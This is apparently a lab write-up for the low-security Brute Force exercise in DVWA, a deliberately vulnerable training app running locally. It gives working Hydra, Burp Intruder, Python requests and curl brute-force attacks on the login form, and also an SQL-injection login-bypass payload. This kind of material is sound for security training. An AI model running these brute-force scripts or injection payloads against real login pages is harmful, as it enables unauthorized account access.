# DVWA Brute Force — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/brute/

## Vulnerable Parameters
- username (GET parameter)
- password (GET parameter)

## Form Details
- Method: GET
- Login form with username and password fields
- Submits as: `?username=<user>&password=<pass>&Login=Login`
- Default credentials: admin / password

## Source Code Behavior (Low)
- No rate limiting
- No account lockout
- No CAPTCHA
- No CSRF token
- Direct SQL query: `SELECT * FROM users WHERE user='$user' AND password='$pass'`
- GET request — credentials in URL

## Detection
1. Submit wrong credentials — "Username and/or password incorrect."
2. Submit correct credentials — "Welcome to the password protected area admin"
3. No lockout after multiple failures

## Working Attack Methods

### Hydra (HTTP GET form brute force)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 4280 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<session>; security=low"
```

### Burp Suite Intruder
1. Capture request in Burp Proxy
2. Send to Intruder
3. Set password field as payload position
4. Load wordlist (rockyou.txt)
5. Start attack — filter by response length or content

### Python script with requests
```python
import requests

url = "http://127.0.0.1:4280/vulnerabilities/brute/"
cookies = {"PHPSESSID": "<session>", "security": "low"}

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    for password in f:
        password = password.strip()
        params = {"username": "admin", "password": password, "Login": "Login"}
        r = requests.get(url, params=params, cookies=cookies)
        if "Welcome" in r.text:
            print(f"[+] Found password: {password}")
            break
```

### curl (single attempt)
```bash
curl -v "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login" \
  -b "PHPSESSID=<session>;security=low"
```

## Step-by-Step Exploitation
1. Confirm login failure message: "Username and/or password incorrect."
2. Confirm login success message: "Welcome to the password protected area"
3. Run Hydra with rockyou.txt wordlist against admin user
4. Password found: `password`

## Notes
- GET-based login — credentials visible in URL, logs, and browser history
- No protections at all — pure brute force works
- Default DVWA password is "password" — near top of most wordlists
- Also vulnerable to SQL injection: `admin' OR '1'='1` in username field
